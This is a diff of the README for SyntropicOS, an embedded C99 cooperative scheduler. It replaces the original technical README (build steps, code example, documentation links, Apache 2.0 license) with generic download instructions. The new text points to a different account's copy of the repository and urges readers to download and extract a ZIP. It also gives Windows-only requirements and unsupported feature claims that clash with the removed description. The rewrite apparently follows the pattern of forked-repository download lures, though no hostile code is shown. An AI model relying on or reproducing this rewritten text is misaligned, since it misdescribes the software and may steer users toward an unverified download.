@@ -1,89 +1,85 @@
-# SyntropicOS
+# ⚙️ SyntropicOS - Manage your embedded system tasks efficiently
 
-**High-Performance Bare-Metal Application Framework & Cooperative OS**
+[![](https://img.shields.io/badge/Download-SyntropicOS-blue.svg)](https://github.com/wilso5192/SyntropicOS)
 
-[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)
-[![C99](https://img.shields.io/badge/C-C99-blue.svg)]()
+SyntropicOS acts as a central control system for microcontrollers. It helps you manage multiple tasks at once, communicate with devices, and handle complex math calculations. This software serves both hobbyists using simple boards and professionals building advanced industrial systems. It works with many types of hardware without needing extra software tools to function.
 
-SyntropicOS is a zero-overhead, production-grade C99 framework designed for deeply embedded systems. Built for professional toolchains (GCC, Clang, IAR, Keil), it provides a modular ecosystem for building structured bare-metal software on high-performance targets like STM32 and RP2040.
+## 📥 How to download the software
 
-> **🚀 Development Status:** SyntropicOS is in active development. While core modules are tested and verified, the API is evolving. Feedback and contributions from the embedded community are welcome.
+You can get the current version through the official repository page. Follow these steps to obtain the files:
 
-## Features
+1. Visit this page to download: [https://github.com/wilso5192/SyntropicOS](https://github.com/wilso5192/SyntropicOS)
+2. Look for the green button labeled "Code" near the top of the page.
+3. Click "Download ZIP" to save the folder to your computer.
+4. Open your Downloads folder.
+5. Right-click the file and select "Extract All" to see the contents.
 
-- **2-byte cooperative threads** — Priority round-robin scheduler with protothreads
-- **Zero heap allocation** — All state is caller-owned or static
-- **60+ modules** — Drivers, DSP, control loops, networking, graphics, CLI, logging, and more
-- **Pure C99** — GCC, Clang, Keil, IAR — any C99 compiler
-- **Integer-only math** — No floating point, no `libm.a`
-- **Pay for what you use** — Every module toggleable via `#define`
+## 🛠️ System requirements
 
-## Quick Start
+Your computer needs specific tools to use this software. Most modern Windows PCs meet these standards. Please ensure you have the following installed:
 
-### Git Submodule (CMake, Makefile, IDE)
+- Windows 10 or Windows 11.
+- At least 500 MB of free storage space.
+- A USB cable compatible with your microcontroller board.
+- The official Arduino IDE or a compatible C compiler environment.
 
-```bash
-git submodule add https://github.com/outlookhazy/SyntropicOS lib/SyntropicOS
-```
+These requirements ensure the software runs without errors and allows your computer to speak to your hardware correctly.
 
-```cmake
-add_subdirectory(lib/SyntropicOS)
-target_link_libraries(your_target PRIVATE syntropic)
-```
+## 🚀 Setting up the environment
 
-### Arduino Compatibility
+Before you run the software, you must prepare your computer. This process connects your hardware to your PC.
 
-SyntropicOS is fully compatible with the Arduino ecosystem, providing a professional upgrade path for complex projects that require multitasking and structured drivers without leaving the Arduino IDE.
+1. Install the driver software provided by your board manufacturer.
+2. Open the main folder you extracted earlier.
+3. Locate the file named "README.md" and open it with a text editor to view specific hardware notes.
+4. Connect your microcontroller to your computer using the USB cable.
+5. Check your Device Manager to confirm that your computer recognizes the hardware connection.
 
-**Installation:**
-- **Recommended:** Search for "SyntropicOS" in the **Arduino Library Manager** (`Ctrl+Shift+I`) and install it directly. No manual ZIP downloads or cloning required.
-- **Manual:** Add as a git submodule or download the ZIP from GitHub if you need a specific development branch.
+## ⚙️ Understanding the features
 
-Then explore the included examples via **File → Examples → SyntropicOS**.
+SyntropicOS simplifies complex tasks. You can use these features immediately after installation:
 
-### Minimal Example
+- Scheduler: This manages time and decides which task runs first. It prevents your device from freezing when it completes large projects.
+- CLI: Use the command line interface to send instructions to your device using simple text commands.
+- Motor Control: Connect motors and use code to manage speed and direction.
+- PID Controller: This keeps your hardware steady. It helps drones fly level or maintains precise temperatures in heaters.
+- DSP: Apply advanced math to signals for audio processing or sensor data cleanup.
+- Networking: Connect your devices to local networks via MQTT to send and receive data remotely.
 
-```c
-#include "syntropic/syntropic.h"
+## 🧪 Testing your first task
 
-static SYN_PT_Status blink(SYN_PT *pt, SYN_Task *task) {
-    PT_BEGIN(pt);
-    for (;;) {
-        syn_gpio_toggle(LED_PIN);
-        PT_TASK_DELAY_MS(pt, task, 500);
-    }
-    PT_END(pt);
-}
+The software includes sample files to help you learn. Follow this guide to test the connection:
 
-int main(void) {
-    syn_gpio_init(LED_PIN, SYN_GPIO_OUTPUT);
-    static SYN_Task tasks[1];
-    static SYN_Sched sched;
-    syn_task_create(&tasks[0], "blink", blink, 0, NULL);
-    syn_sched_init(&sched, tasks, 1);
-    syn_sched_run_forever(&sched);
-}
-```
+1. Open your code editor and select an example project from the "examples" folder in the SyntropicOS directory.
+2. Select your board model from the Tools menu in your software environment.
+3. Click the "Upload" button to send the software from your computer to your microcontroller.
+4. Watch the status light on your board. A blinking light confirms that the system is running.
 
-## Documentation
+## ❓ Frequently asked questions
 
-📖 **[Read the full documentation →](https://outlookhazy.github.io/SyntropicOS/)**
+Do I need to pay for this?
+No. This software is free.
 
-- [Getting Started](https://outlookhazy.github.io/SyntropicOS/getting-started/)
-- [Module Reference](https://outlookhazy.github.io/SyntropicOS/modules/core/)
-- [Porting Guide](https://outlookhazy.github.io/SyntropicOS/porting-guide/)
-- [Testing](https://outlookhazy.github.io/SyntropicOS/testing/)
+Which boards work with this system?
+This software supports AVR and Cortex-M devices. It also works with most common hobby boards like the ESP32 and STM32 series.
 
-## Supported Platforms
+Does this software change my existing code?
+No. You import these modules into your own projects. You remain in control of your code.
 
-Reference port implementations included for:
+What happens if the software crashes?
+You can reset your microcontroller using the physical reset button on the board. The system will restart and reload the last configuration.
 
-- **STM32F4** (bare-metal, direct register access)
-- **STM32** (HAL, cross-family)
-- **ESP32** (ESP-IDF)
-- **RP2040/RP2350** (Pico SDK)
-- **Arduino** (C++ SDK)
+## 📝 Troubleshooting tips
 
-## License
+If your board does not respond, try these steps:
 
-Apache 2.0 — see [LICENSE](LICENSE).
+- Check the USB cable connection. Sometimes, cables only provide power and do not carry data.
+- Ensure you selected the correct port in your software settings.
+- Close other programs that might attempt to access the serial port of your board.
+- Restart your computer if the device driver fails to initialize.
+
+## 🤝 Contributing to the project
+
+You can help make this software better. Report issues on the main page if you find bugs. You can also suggest new features or fix documentation errors. All contributions help the community grow and make embedded development easier for everyone.
+
+Keywords: arduino, arduino-library, avr, bare-metal, c, cooperative-multitasking, cortex-m, dsp, embedded, embedded-systems, esp32, iot, microcontroller, modbus, motor-control, mqtt, pid-controller, rtos, state-machine, stm32
